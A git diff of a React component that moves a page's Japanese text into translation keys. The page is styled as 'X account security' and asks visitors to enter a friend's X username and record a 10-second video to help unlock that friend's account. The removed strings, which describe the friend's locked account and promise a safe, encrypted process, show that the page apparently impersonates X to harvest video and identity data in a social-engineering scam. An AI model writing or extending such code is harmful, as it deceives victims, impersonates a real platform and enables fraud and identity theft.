@@ -1,21 +1,24 @@
 import { useState, useEffect } from 'react'
 import { useNavigate } from 'react-router-dom'
+import { useLanguage } from '../contexts/LanguageContext'
+import { getTranslation } from '../utils/translations'
 import './VerificationStart.css'
 
 function VerificationStart() {
   const navigate = useNavigate()
+  const { language } = useLanguage()
   const [step, setStep] = useState(1)
   const [username, setUsername] = useState('')
+  const t = (key) => getTranslation(language, key)
 
   useEffect(() => {
-    // Check if user is logged in
     const isLoggedIn = localStorage.getItem('isLoggedIn')
     if (!isLoggedIn) {
-      alert('認証を開始するには、まずログインが必要です。')
+      alert(t('mustLoginFirst'))
       navigate('/login')
       return
     }
-  }, [navigate])
+  }, [navigate, language])
 
   const handleContinue = () => {
     if (step === 1) {
@@ -39,17 +42,15 @@ function VerificationStart() {
               </g>
             </svg>
             
-            <h1 className="verification-title">Xアカウントセキュリティへようこそ</h1>
+            <h1 className="verification-title">{t('welcomeToSecurity')}</h1>
             
             <p className="verification-description">
-              友達のアカウントアクセスが制限されているため、そのアカウントに
-              より高いセキュリティ要件を適用させていただいています。
-              友達のアカウントのロックを解除するため、このセキュリティプログラムを作成いたします。
+              {t('accountLocked')}
             </p>
 
             <div className="help-notice">
               <p className="help-text">
-                友達がXアカウントに復帰できるよう、本人確認を支援します。
+                {t('helpRecover')}
               </p>
             </div>
 
@@ -58,36 +59,34 @@ function VerificationStart() {
                 <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0" style={{marginRight: '8px'}}>
                   <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                 </svg>
-                以下では、プロセスを詳しく説明し、アカウントロック解除を完全に実行できるよう支援いたします。
+                {t('processDetails')}
               </p>
               <div className="info-item">
                 <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0">
                   <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                 </svg>
-                <span>短時間10秒動画認証</span>
+                <span>{t('videoVerification')}</span>
               </div>
               <div className="info-item">
                 <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0">
                   <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                 </svg>
-                <span>安全で暗号化されたプロセス</span>
+                <span>{t('secureProcess')}</span>
               </div>
               <div className="info-item">
                 <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0">
                   <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                 </svg>
-                <span>友達のアクセス復旧支援</span>
+                <span>{t('supportFriendRecovery')}</span>
               </div>
             </div>
 
             <button className="btn-continue" onClick={handleContinue}>
-              続行
+              {t('continueBtn')}
             </button>
 
             <p className="privacy-note">
-              続行することで、友達の本人確認支援に同意したものとみなされます。
-              お客様の動画は安全に保存され、友達のXアカウントのロック解除の
-              認証目的のみに使用されます。
+              {t('privacyAgreement')}
             </p>
           </div>
         ) : (
@@ -99,14 +98,14 @@ function VerificationStart() {
               </g>
             </svg>
 
-            <h1 className="verification-title">友達のユーザー名を入力</h1>
+            <h1 className="verification-title">{t('enterFriendUsername')}</h1>
             
             <p className="verification-description">
-              ロック解除が必要な友達のXユーザー名を入力してください。
+              {t('friendUsernameDesc')}
             </p>
 
             <div className="input-group">
-              <label htmlFor="username">友達のXユーザー名</label>
+              <label htmlFor="username">{t('friendUsername')}</label>
               <div className="input-wrapper">
                 <span className="input-prefix">@</span>
                 <input
@@ -114,18 +113,18 @@ function VerificationStart() {
                   id="username"
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
-                  placeholder="friendusername"
+                  placeholder={t('friendUsernamePlaceholder')}
                   className="input-field"
                 />
               </div>
             </div>
 
             <div className="help-box">
-              <p>認証することで、以下を確認したものとみなされます：</p>
+              <p>{t('verificationTerms')}</p>
               <ul>
-                <li>この人を個人的に知っている</li>
-                <li>アカウントアクセス復旧を支援している</li>
-                <li>提供する情報が正確である</li>
+                <li>{t('knowPersonally')}</li>
+                <li>{t('supportingRecovery')}</li>
+                <li>{t('accurateInfo')}</li>
               </ul>
             </div>
 
@@ -134,11 +133,11 @@ function VerificationStart() {
               onClick={handleContinue}
               disabled={!username.trim()}
             >
-              認証開始
+              {t('startVerification')}
             </button>
 
             <button className="btn-back" onClick={() => setStep(1)}>
-              戻る
+              {t('back')}
             </button>
           </div>
         )}
